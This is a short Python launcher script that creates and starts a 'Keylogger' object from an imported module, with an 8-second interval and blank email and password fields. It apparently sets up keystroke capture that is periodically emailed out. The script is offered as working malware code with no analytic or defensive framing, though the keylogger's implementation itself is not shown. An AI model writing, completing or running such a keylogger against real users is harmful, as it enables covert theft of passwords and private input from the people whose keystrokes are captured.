import main

my_keylogger = main.Keylogger(time_interval=8, email="", password="")
my_keylogger.start()

print("Goodbye!")
